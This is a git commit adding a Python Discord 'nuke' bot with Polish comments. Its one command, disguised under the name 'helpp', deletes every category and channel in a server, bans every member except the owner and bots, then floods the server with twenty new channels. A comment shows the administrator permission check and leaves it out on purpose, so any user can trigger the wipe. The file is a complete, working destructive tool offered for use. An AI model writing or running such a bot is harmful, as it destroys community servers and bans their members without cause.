9f696a82948e3eb6ddf97c5eb53b40ec70c1dde3
mrthejvp6rq <alexvolkov234234682374623746@gmail.com>
2024-12-29 21:51:58 +0100

    Create nukebot.py

---
+++ nukebot.py
@@ -0,0 +1,29 @@
+# importowanie bibliotek
+import discord
+from discord.ext import commands
+from config import prefix, token
+
+# Zmienne
+intents = discord.Intents.all()
+nb = commands.Bot(command_prefix=prefix, intents=intents)
+nazwa = "bot" # Tutaj wpisz nazwe dla kanału
+
+# Dalszy kod
+@nb.event
+async def on_ready():
+    print(f"{nb.user} Online")
+
+@nb.command()
+#Tutaj macie permisje dla administratora: @commands.has_permissions(administrator=True) ale po co ¯\_(ツ)_/¯.
+async def helpp(ctx):
+    for category in ctx.guild.categories:
+        await category.delete()
+    for channel in ctx.guild.channels:
+        await channel.delete()
+    for member in ctx.guild.members:
+        if member != ctx.guild.owner and not member.bot: # To potrzebne by bot nie zbanował właściciela i botów :>.
+            await member.ban(reason="Bla bla bla, wpisz co chcesz.")
+    for i in range(20):
+        await ctx.guild.create_text_channel(name=nazwa)
+   
+nb.run(token)
